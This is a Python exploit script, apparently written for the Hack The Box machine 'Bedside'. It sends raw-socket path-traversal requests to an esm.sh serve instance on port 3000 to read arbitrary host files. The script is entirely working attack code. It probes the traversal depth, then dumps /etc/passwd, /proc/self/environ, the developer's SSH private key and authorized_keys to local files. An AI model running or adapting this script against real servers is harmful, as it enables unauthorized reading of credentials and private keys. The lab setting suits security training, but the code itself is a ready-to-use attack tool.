#!/usr/bin/env python3
"""
Bedside (HTB) — LFI against host esm.sh serve on :3000 (from container).

esm.sh serve joins rootDir + request path without fully blocking `../`.
Use **raw sockets** — urllib/curl may normalize `/../../../../` away.

Run from container (datawrangler) with network reachability to 172.17.0.1:3000,
or via any foothold that can TCP to the host bridge IP.

Usage:
  python3 lfi_esm.py --host 172.17.0.1 --port 3000 --file /etc/passwd
  python3 lfi_esm.py --host 172.17.0.1 --dump-keys --out-dir ./keys
  python3 lfi_esm.py --probe-depth
"""
from __future__ import annotations

import argparse
import re
import socket
import sys
from pathlib import Path


def raw_get(host: str, port: int, path: str, timeout: float = 8.0) -> tuple[int, bytes]:
    if not path.startswith("/"):
        path = "/" + path
    req = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    s = socket.create_connection((host, port), timeout)
    try:
        s.sendall(req)
        s.settimeout(timeout)
        data = b""
        while True:
            try:
                chunk = s.recv(65536)
                if not chunk:
                    break
                data += chunk
            except socket.timeout:
                break
    finally:
        s.close()
    if b"\r\n\r\n" not in data:
        return 0, data
    header, body = data.split(b"\r\n\r\n", 1)
    m = re.match(br"HTTP/\d\.\d (\d+)", header)
    code = int(m.group(1)) if m else 0
    return code, body


def find_prefix(host: str, port: int) -> str | None:
    for n in range(1, 12):
        pref = "/" + "../" * n
        code, body = raw_get(host, port, pref + "etc/passwd")
        if code == 200 and b"root:" in body:
            print(f"[+] depth={n} works ({len(body)} B)", file=sys.stderr)
            return pref
    return None


def main() -> int:
    ap = argparse.ArgumentParser(description="Bedside esm.sh LFI (raw socket)")
    ap.add_argument("--host", default="172.17.0.1")
    ap.add_argument("--port", type=int, default=3000)
    ap.add_argument("--file", help="absolute path on host, e.g. /etc/passwd")
    ap.add_argument("--probe-depth", action="store_true")
    ap.add_argument("--dump-keys", action="store_true", help="developer SSH material + user.txt")
    ap.add_argument("--out-dir", default=".")
    ap.add_argument("--prefix", default=None, help="force traversal prefix, e.g. /../../../../")
    args = ap.parse_args()

    if args.probe_depth:
        for n in range(1, 12):
            pref = "/" + "../" * n
            code, body = raw_get(args.host, args.port, pref + "etc/passwd")
            hit = b"root:" in body
            print(f"depth={n} code={code} len={len(body)} hit={hit}")
        return 0

    pref = args.prefix or find_prefix(args.host, args.port)
    if not pref:
        print("[-] no working traversal depth", file=sys.stderr)
        return 1
    print(f"[*] prefix={pref!r}", file=sys.stderr)

    targets: list[str] = []
    if args.file:
        targets.append(args.file.lstrip("/"))
    if args.dump_keys:
        targets.extend(
            [
                "home/developer/user.txt",
                "home/developer/.ssh/id_rsa",
                "home/developer/.ssh/id_rsa.pub",
                "home/developer/.ssh/authorized_keys",
                "etc/passwd",
                "proc/self/cmdline",
                "proc/self/environ",
            ]
        )
    if not targets:
        targets = ["etc/passwd"]

    out = Path(args.out_dir)
    out.mkdir(parents=True, exist_ok=True)

    for rel in targets:
        path = pref + rel
        code, body = raw_get(args.host, args.port, path)
        print(f"[{code}] {path} ({len(body)} B)", file=sys.stderr)
        if code != 200 or body.startswith(b"Not Found") or b"<!DOCTYPE" in body[:40]:
            continue
        safe = re.sub(r"[^a-zA-Z0-9._-]+", "_", rel)
        dest = out / safe
        dest.write_bytes(body)
        print(f"[+] saved {dest}")
        if rel.endswith("user.txt") or b"BEGIN OPENSSH" in body or b"root:" in body[:20]:
            # print small text hits
            if len(body) < 2000 and b"\0" not in body[:100]:
                sys.stdout.buffer.write(body)
                if not body.endswith(b"\n"):
                    sys.stdout.buffer.write(b"\n")
    return 0


if __name__ == "__main__":
    sys.exit(main())
